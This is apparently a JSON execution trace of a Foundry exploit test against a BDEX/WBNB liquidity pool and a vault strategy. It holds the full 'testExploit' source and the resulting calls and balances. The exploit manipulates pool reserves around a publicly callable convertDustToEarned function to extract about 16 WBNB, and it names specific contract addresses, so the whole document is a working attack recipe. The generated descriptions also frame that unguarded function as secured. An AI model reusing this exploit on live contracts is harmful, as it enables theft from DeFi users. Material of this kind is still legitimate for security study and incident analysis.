@@ -1,0 +1,430 @@
+{
+  "logs": {
+    "calls": [
+      {
+        "id": "401211",
+        "contract": "ContractTest",
+        "function": "testExploit",
+        "args": "",
+        "original_code": "    function testExploit() public {\n        address(WBNB).call{value: 34 ether}(\"\");\n        uint256 amountin = WBNB.balanceOf(address(this));\n        WBNB.transfer(address(Pair), amountin);\n        (uint256 BDEXReserve, uint256 WBNBReserve,) = Pair.getReserves();\n        uint256 amountout = (998 * amountin * BDEXReserve) / (1000 * WBNBReserve + 998 * amountin);\n        Pair.swap(amountout, 0, address(this), \"\");\n        vaultsStrategy.convertDustToEarned();\n        uint256 amountBDEX = BDEX.balanceOf(address(this));\n        BDEX.transfer(address(Pair), amountBDEX);\n        (uint256 BDEXReserve1, uint256 WBNBReserve1,) = Pair.getReserves();\n        uint256 amountWBNB = (998 * amountBDEX * WBNBReserve1) / (1000 * BDEXReserve1 + 998 * amountBDEX);\n        Pair.swap(0, amountWBNB, address(this), \"\");\n        address(WBNB).call(abi.encodeWithSignature(\"withdraw(uint256)\", 34 * 1e18));\n\n        emit log_named_decimal_uint(\"[End] Attacker WBNB balance after exploit\", WBNB.balanceOf(address(this)), 18);\n    }\n\n",
+        "description": "1. **Core functions**:  \n   This function is designed to simulate an exploit scenario involving a decentralized exchange (DEX) and two tokens, WBNB and BDEX. It performs a series of steps to manipulate token balances and reserves in a liquidity pool. First, it sends 34 ether to the WBNB contract to convert it into WBNB tokens. Then, it transfers these WBNB tokens to a liquidity pool (Pair). Using the pool's reserves, it calculates and swaps tokens to maximize the output of BDEX tokens. After converting some dust (small leftover amounts) into earned tokens, it transfers BDEX tokens back to the pool and calculates the resulting WBNB tokens. Finally, it withdraws the WBNB tokens and logs the attacker's final WBNB balance.\n\n2. **Security mechanism**:  \n   The function does not explicitly include security mechanisms like access control or input validation. However, it relies on the underlying logic of the WBNB and Pair contracts for token transfers and swaps. The use of `call` for sending ether and invoking the `withdraw` function is a low-level operation that requires careful handling to avoid vulnerabilities. The function emits an event at the end to log the attacker's WBNB balance, which could be used for monitoring or debugging purposes.\n\n3. **Parameter Function**:  \n   The function does not take any parameters. All the values used, such as the 34 ether amount and the calculations for token swaps, are hardcoded within the function. This makes the function specific to this particular exploit scenario and not reusable for other purposes without modification.\n\n4. **Return description**:  \n   The function does not return any value. Instead, it performs a series of operations to manipulate token balances and reserves in the liquidity pool. The final result is logged as an event, which shows the attacker's WBNB balance after executing the exploit. The calculations for token swaps are based on the pool's reserves and the amount of tokens being swapped, ensuring that the output values are derived from the current state of the pool.\n\n**In summary**,  \nThis function simulates an exploit by manipulating token balances and reserves in a liquidity pool. It uses hardcoded values and low-level operations to perform a series of swaps and transfers, ultimately logging the attacker's final WBNB balance. While it lacks explicit security mechanisms, it relies on the underlying logic of the contracts it interacts with.",
+        "return_value": "Returned",
+        "depth": 0,
+        "internal_calls": []
+      },
+      {
+        "id": "534",
+        "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
+        "function": "balanceOf",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "return_value": "34000000000000000000 [3.4e19]",
+        "depth": 1,
+        "internal_calls": [],
+        "value": null
+      },
+      {
+        "id": "8062",
+        "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
+        "function": "transfer",
+        "args": "0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D, 34000000000000000000 [3.4e19]",
+        "return_value": "true",
+        "depth": 1,
+        "internal_calls": [],
+        "value": null
+      },
+      {
+        "id": "2504",
+        "contract": "0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D",
+        "function": "getReserves",
+        "args": "",
+        "original_code": "    function getReserves() public view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) {\n        _reserve0 = reserve0;\n        _reserve1 = reserve1;\n        _blockTimestampLast = blockTimestampLast;\n    }\n\n",
+        "description": "1. **Core functions**:  \nThe `getReserves` function is designed to retrieve and provide information about the current state of two reserves (referred to as `reserve0` and `reserve1`) and the timestamp of the last block when these reserves were updated. This function is useful for tracking the balances or quantities of two assets in a system, such as in a decentralized exchange or liquidity pool.\n\n2. **Security mechanism**:  \nThe function includes the `view` modifier, which ensures that it does not modify the state of the contract. This means it only reads data from the blockchain, making it safe to call without incurring gas costs or risking unintended changes to the contract. Additionally, since it is marked as `public`, it can be accessed by anyone, but the `view` modifier ensures it remains read-only.\n\n3. **Parameter Function**:  \nThe function does not take any parameters. It simply reads and returns the values of three internal variables: `reserve0`, `reserve1`, and `blockTimestampLast`. These variables represent the current state of the reserves and the time of the last update.\n\n4. **Return description**:  \nThe function returns three values:  \n- `_reserve0`: The current value of `reserve0`, which represents the quantity of the first asset.  \n- `_reserve1`: The current value of `reserve1`, which represents the quantity of the second asset.  \n- `_blockTimestampLast`: The timestamp of the last block when the reserves were updated.  \nThe function directly retrieves these values from the contract's storage and returns them without any additional calculations.\n\n**In summary**, the `getReserves` function is a simple, read-only utility that provides information about the current state of two reserves and the time they were last updated. It is secure and efficient, as it does not modify the contract's state and can be called without cost.",
+        "return_value": "23801780384714259372163 [2.38e22], 23379814044202330489 [2.337e19], 1666920996 [1.666e9]",
+        "depth": 1,
+        "internal_calls": []
+      },
+      {
+        "id": "131435",
+        "contract": "0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D",
+        "function": "swap",
+        "args": "14092068546132948747119 [1.409e22], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": "    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {\n        require(amount0Out > 0 || amount1Out > 0, 'BLP: INSUFFICIENT_OUTPUT_AMOUNT');\n        uint112 _reserve0 = reserve0; // gas savings\n        uint112 _reserve1 = reserve1; // gas savings\n        require(amount0Out < _reserve0 && amount1Out < _reserve1, 'BLP: INSUFFICIENT_LIQUIDITY');\n\n        uint balance0;\n        uint balance1;\n        { // scope for _token{0,1}, avoids stack too deep errors\n        address _token0 = token0;\n        address _token1 = token1;\n        require(to != _token0 && to != _token1, 'BLP: INVALID_TO');\n        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n        if (data.length > 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\n        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\n        require(amount0In > 0 || amount1In > 0, 'BLP: INSUFFICIENT_INPUT_AMOUNT');\n        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n            uint balance0Adjusted = balance0.mul(10000);\n            uint balance1Adjusted = balance1.mul(10000);\n            { // avoids stack too deep errors\n                if (amount0In > 0) {\n                    uint amount0InFee = amount0In.mul(swapFee);\n                    balance0Adjusted = balance0Adjusted.sub(amount0InFee);\n                    collectedFee0 = uint112(uint(collectedFee0).add(amount0InFee));\n                }\n                if (amount1In > 0) {\n                    uint amount1InFee = amount1In.mul(swapFee);\n                    balance1Adjusted = balance1Adjusted.sub(amount1InFee);\n                    collectedFee1 = uint112(uint(collectedFee1).add(amount1InFee));\n                }\n                uint32 _tokenWeight0 = tokenWeight0;// gas savings\n                if (_tokenWeight0 == 50) { // gas savings for pair 50/50\n                    require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(10000**2), 'BLP: K');\n                } else {\n                    require(IBdexFormula(formula).ensureConstantValue(uint(_reserve0).mul(10000), uint(_reserve1).mul(10000), balance0Adjusted, balance1Adjusted, _tokenWeight0), 'BLP: K');\n                }\n            }\n        }\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    }\n\n    // force balances to match reserves\n",
+        "description": "1. **Core functions**:  \n   The `swap` function allows users to exchange one type of token for another within a decentralized exchange. It handles the transfer of tokens from the contract to the user and ensures that the exchange is valid by checking the available reserves and applying fees. The function also updates the reserves after the swap and emits an event to log the transaction details.\n\n2. **Security mechanism**:  \n   - The `lock` modifier prevents reentrancy attacks by ensuring the function cannot be called again until it completes.  \n   - The `require` statements enforce conditions like sufficient output amounts, adequate liquidity, and valid recipient addresses.  \n   - The `_safeTransfer` function ensures tokens are safely transferred to the recipient.  \n   - Fees are calculated and deducted from the input amounts to maintain the system's integrity.  \n   - The function checks the constant product formula (`K`) to ensure the swap does not disrupt the pool's balance.  \n\n3. **Parameter Function**:  \n   - `amount0Out` and `amount1Out`: The amounts of the two tokens the user wants to receive.  \n   - `to`: The address receiving the tokens.  \n   - `data`: Optional data for additional logic, such as callback functions.  \n   These parameters define the swap details, including what tokens are being exchanged, how much, and where they are sent.  \n\n4. **Return description**:  \n   The function does not return a value directly. Instead, it updates the contract's internal state, including the reserves and collected fees. It also emits a `Swap` event containing details like the sender, input and output amounts, and the recipient.  \n\n**In summary**, the `swap` function facilitates token exchanges in a decentralized manner, ensuring security through checks, fees, and reserve updates. It uses parameters to define the swap details and emits an event to record the transaction.",
+        "return_value": "Returned",
+        "depth": 1,
+        "internal_calls": [
+          {
+            "id": "86387",
+            "contract": "0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867",
+            "function": "transfer",
+            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 14092068546132948747119 [1.409e22]",
+            "return_value": "true",
+            "depth": 2,
+            "internal_calls": [
+              {
+                "id": "79187",
+                "contract": "0x319A1Fc65775020dE5D996c9A6A16d5401439E88",
+                "function": "transfer",
+                "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 14092068546132948747119 [1.409e22]",
+                "return_value": "true",
+                "depth": 3,
+                "internal_calls": []
+              }
+            ],
+            "value": null
+          },
+          {
+            "id": "2993",
+            "contract": "0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867",
+            "function": "balanceOf",
+            "args": "0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D",
+            "return_value": "9709711838581310625044 [9.709e21]",
+            "depth": 2,
+            "internal_calls": [
+              {
+                "id": "2296",
+                "contract": "0x319A1Fc65775020dE5D996c9A6A16d5401439E88",
+                "function": "balanceOf",
+                "args": "0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D",
+                "return_value": "9709711838581310625044 [9.709e21]",
+                "depth": 3,
+                "internal_calls": []
+              }
+            ],
+            "value": null
+          },
+          {
+            "id": "534",
+            "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
+            "function": "balanceOf",
+            "args": "0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D",
+            "return_value": "57379814044202330489 [5.737e19]",
+            "depth": 2,
+            "internal_calls": [],
+            "value": null
+          }
+        ]
+      },
+      {
+        "id": "119555",
+        "contract": "0xB2B1DC3204ee8899d6575F419e72B53E370F6B20",
+        "function": "convertDustToEarned",
+        "args": "",
+        "original_code": "    function convertDustToEarned() public whenNotPaused {\n        require(isAutoComp, \"!isAutoComp\");\n\n        // Converts dust tokens into earned tokens, which will be reinvested on the next earn().\n\n        // Converts token0 dust (if any) to earned tokens\n        uint256 _token0Amt = IERC20(token0Address).balanceOf(address(this));\n        if (token0Address != earnedAddress && _token0Amt > 0) {\n            _vswapSwapToken(token0Address, earnedAddress, _token0Amt);\n        }\n\n        // Converts token1 dust (if any) to earned tokens\n        uint256 _token1Amt = IERC20(token1Address).balanceOf(address(this));\n        if (token1Address != earnedAddress && _token1Amt > 0) {\n            _vswapSwapToken(token1Address, earnedAddress, _token1Amt);\n        }\n    }\n\n",
+        "description": "1. **Core functions:**  \n   The `convertDustToEarned` function is designed to convert small leftover amounts (referred to as \"dust\") of two specific tokens (`token0` and `token1`) into a different token (`earnedAddress`). This conversion ensures that these leftover amounts are not wasted and can be reinvested later. The function checks if there are any remaining balances of `token0` and `token1` in the contract and swaps them for the `earnedAddress` token if they exist.\n\n2. **Security mechanism:**  \n   The function includes two key security measures:  \n   - `whenNotPaused`: This modifier ensures the function can only be executed when the contract is not paused, preventing actions during critical or maintenance periods.  \n   - `require(isAutoComp, \"!isAutoComp\")`: This check ensures the function only runs if the `isAutoComp` flag is true, adding an extra layer of control to prevent unauthorized or unintended use.  \n\n3. **Parameter Function:**  \n   The function does not take any parameters. Instead, it relies on predefined contract variables (`token0Address`, `token1Address`, and `earnedAddress`) to determine which tokens to convert and into which token they should be swapped.  \n\n4. **Return description:**  \n   The function does not return any value. Its purpose is to perform internal operations (swapping tokens) rather than calculating or providing an output.  \n\n**In summary,**  \nThe `convertDustToEarned` function converts small leftover amounts of two tokens into another token for reinvestment. It includes security checks to ensure it only runs when the contract is active and authorized. The function does not take parameters or return a value, focusing solely on swapping tokens internally.",
+        "return_value": "Returned",
+        "depth": 1,
+        "internal_calls": [
+          {
+            "id": "6993",
+            "contract": "0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867",
+            "function": "balanceOf",
+            "args": "0xB2B1DC3204ee8899d6575F419e72B53E370F6B20",
+            "return_value": "105959281573910400 [1.059e17]",
+            "depth": 2,
+            "internal_calls": [
+              {
+                "id": "6296",
+                "contract": "0x319A1Fc65775020dE5D996c9A6A16d5401439E88",
+                "function": "balanceOf",
+                "args": "0xB2B1DC3204ee8899d6575F419e72B53E370F6B20",
+                "return_value": "105959281573910400 [1.059e17]",
+                "depth": 3,
+                "internal_calls": []
+              }
+            ],
+            "value": null
+          },
+          {
+            "id": "2534",
+            "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
+            "function": "balanceOf",
+            "args": "0xB2B1DC3204ee8899d6575F419e72B53E370F6B20",
+            "return_value": "18924462198662965022 [1.892e19]",
+            "depth": 2,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "2717",
+            "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
+            "function": "allowance",
+            "args": "0xB2B1DC3204ee8899d6575F419e72B53E370F6B20, 0xC6747954a9B3A074d8E4168B444d7F397FeE76AA",
+            "return_value": "162360459439061475742 [1.623e20]",
+            "depth": 2,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "5220",
+            "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
+            "function": "approve",
+            "args": "0xC6747954a9B3A074d8E4168B444d7F397FeE76AA, 181284921637724440764 [1.812e20]",
+            "return_value": "true",
+            "depth": 2,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "79391",
+            "contract": "0xC6747954a9B3A074d8E4168B444d7F397FeE76AA",
+            "function": "swapExactTokensForTokens",
+            "args": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867, 18924462198662965022 [1.892e19], 1, [0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D], 0xB2B1DC3204ee8899d6575F419e72B53E370F6B20, 1667153919 [1.667e9]",
+            "return_value": "0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000106a1321a849d271e000000000000000000000000000000000000000000000082595033ae6c5da4cd",
+            "depth": 2,
+            "internal_calls": [
+              {
+                "id": "17088",
+                "contract": "0xCB9f345c32e2216e5F13E1A816059C6435C92038",
+                "function": "getFactoryAmountsOut",
+                "args": "0x2C358A7C62cdb9D554A65A86EEa034bc55D1E715, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867, 18924462198662965022 [1.892e19], [0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D]",
+                "return_value": "0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000106a1321a849d271e000000000000000000000000000000000000000000000082595033ae6c5da4cd",
+                "depth": 3,
+                "internal_calls": [
+                  {
+                    "id": "405",
+                    "contract": "0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D",
+                    "function": "token0",
+                    "args": "",
+                    "return_value": "0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867",
+                    "depth": 4,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "504",
+                    "contract": "0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D",
+                    "function": "getReserves",
+                    "args": "",
+                    "flag": 1,
+                    "return_value": "9709711838581310625044 [9.709e21], 57379814044202330489 [5.737e19], 1667152119 [1.667e9]",
+                    "depth": 4,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "9907",
+                    "contract": "0x2C358A7C62cdb9D554A65A86EEa034bc55D1E715",
+                    "function": "getWeightsAndSwapFee",
+                    "args": "0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D",
+                    "return_value": "0x000000000000000000000000000000000000000000000000000000000000003200000000000000000000000000000000000000000000000000000000000000320000000000000000000000000000000000000000000000000000000000000014",
+                    "depth": 4,
+                    "internal_calls": [
+                      {
+                        "id": "2630",
+                        "contract": "0x50A76ACc2838CA53488F51FDc5306C27168A57F3",
+                        "function": "getWeightsAndSwapFee",
+                        "args": "0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D",
+                        "return_value": "0x000000000000000000000000000000000000000000000000000000000000003200000000000000000000000000000000000000000000000000000000000000320000000000000000000000000000000000000000000000000000000000000014",
+                        "depth": 5,
+                        "internal_calls": []
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "id": "6948",
+                "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
+                "function": "transferFrom",
+                "args": "0xB2B1DC3204ee8899d6575F419e72B53E370F6B20, 0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D, 18924462198662965022 [1.892e19]",
+                "return_value": "true",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "405",
+                "contract": "0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D",
+                "function": "token0",
+                "args": "",
+                "return_value": "0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "40266",
+                "contract": "0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D",
+                "function": "swap",
+                "args": "2404512430273989551309 [2.404e21], 0, 0xB2B1DC3204ee8899d6575F419e72B53E370F6B20, 0x",
+                "flag": 1,
+                "return_value": "Returned",
+                "depth": 3,
+                "internal_calls": [
+                  {
+                    "id": "23787",
+                    "contract": "0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867",
+                    "function": "transfer",
+                    "args": "0xB2B1DC3204ee8899d6575F419e72B53E370F6B20, 2404512430273989551309 [2.404e21]",
+                    "return_value": "true",
+                    "depth": 4,
+                    "internal_calls": [
+                      {
+                        "id": "23087",
+                        "contract": "0x319A1Fc65775020dE5D996c9A6A16d5401439E88",
+                        "function": "transfer",
+                        "args": "0xB2B1DC3204ee8899d6575F419e72B53E370F6B20, 2404512430273989551309 [2.404e21]",
+                        "return_value": "true",
+                        "depth": 5,
+                        "internal_calls": []
+                      }
+                    ]
+                  },
+                  {
+                    "id": "2993",
+                    "contract": "0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867",
+                    "function": "balanceOf",
+                    "args": "0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D",
+                    "return_value": "7305199408307321073735 [7.305e21]",
+                    "depth": 4,
+                    "internal_calls": [
+                      {
+                        "id": "2296",
+                        "contract": "0x319A1Fc65775020dE5D996c9A6A16d5401439E88",
+                        "function": "balanceOf",
+                        "args": "0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D",
+                        "return_value": "7305199408307321073735 [7.305e21]",
+                        "depth": 5,
+                        "internal_calls": []
+                      }
+                    ]
+                  },
+                  {
+                    "id": "534",
+                    "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
+                    "function": "balanceOf",
+                    "args": "0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D",
+                    "return_value": "76304276242865295511 [7.63e19]",
+                    "depth": 4,
+                    "internal_calls": []
+                  }
+                ]
+              }
+            ],
+            "value": null
+          }
+        ]
+      },
+      {
+        "id": "2993",
+        "contract": "0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867",
+        "function": "balanceOf",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "return_value": "14092068546132948747119 [1.409e22]",
+        "depth": 1,
+        "internal_calls": [
+          {
+            "id": "2296",
+            "contract": "0x319A1Fc65775020dE5D996c9A6A16d5401439E88",
+            "function": "balanceOf",
+            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+            "return_value": "14092068546132948747119 [1.409e22]",
+            "depth": 2,
+            "internal_calls": [],
+            "value": null
+          }
+        ],
+        "value": null
+      },
+      {
+        "id": "23173",
+        "contract": "0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867",
+        "function": "transfer",
+        "args": "0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D, 14092068546132948747119 [1.409e22]",
+        "return_value": "true",
+        "depth": 1,
+        "internal_calls": [
+          {
+            "id": "22473",
+            "contract": "0x319A1Fc65775020dE5D996c9A6A16d5401439E88",
+            "function": "transfer",
+            "args": "0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D, 14092068546132948747119 [1.409e22]",
+            "return_value": "true",
+            "depth": 2,
+            "internal_calls": [],
+            "value": null
+          }
+        ],
+        "value": null
+      },
+      {
+        "id": "504",
+        "contract": "0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D",
+        "function": "getReserves",
+        "args": "",
+        "flag": 1,
+        "return_value": "7305199408307321073735 [7.305e21], 76304276242865295511 [7.63e19], 1667152119 [1.667e9]",
+        "depth": 1,
+        "internal_calls": []
+      },
+      {
+        "id": "39564",
+        "contract": "0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D",
+        "function": "swap",
+        "args": "0, 50219023434405118803 [5.021e19], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "flag": 1,
+        "return_value": "Returned",
+        "depth": 1,
+        "internal_calls": [
+          {
+            "id": "23162",
+            "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
+            "function": "transfer",
+            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 50219023434405118803 [5.021e19]",
+            "return_value": "true",
+            "depth": 2,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "2993",
+            "contract": "0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867",
+            "function": "balanceOf",
+            "args": "0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D",
+            "return_value": "21397267954440269820854 [2.139e22]",
+            "depth": 2,
+            "internal_calls": [
+              {
+                "id": "2296",
+                "contract": "0x319A1Fc65775020dE5D996c9A6A16d5401439E88",
+                "function": "balanceOf",
+                "args": "0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D",
+                "return_value": "21397267954440269820854 [2.139e22]",
+                "depth": 3,
+                "internal_calls": []
+              }
+            ],
+            "value": null
+          },
+          {
+            "id": "534",
+            "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
+            "function": "balanceOf",
+            "args": "0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D",
+            "return_value": "26085252808460176708 [2.608e19]",
+            "depth": 2,
+            "internal_calls": [],
+            "value": null
+          }
+        ]
+      },
+      {
+        "id": "9195",
+        "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
+        "function": "withdraw",
+        "args": "34000000000000000000 [3.4e19]",
+        "return_value": "Returned",
+        "depth": 1,
+        "internal_calls": [],
+        "value": null
+      },
+      {
+        "id": "534",
+        "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
+        "function": "balanceOf",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "return_value": "16219023434405118803 [1.621e19]",
+        "depth": 1,
+        "internal_calls": [],
+        "value": null
+      }
+    ]
+  }
+}
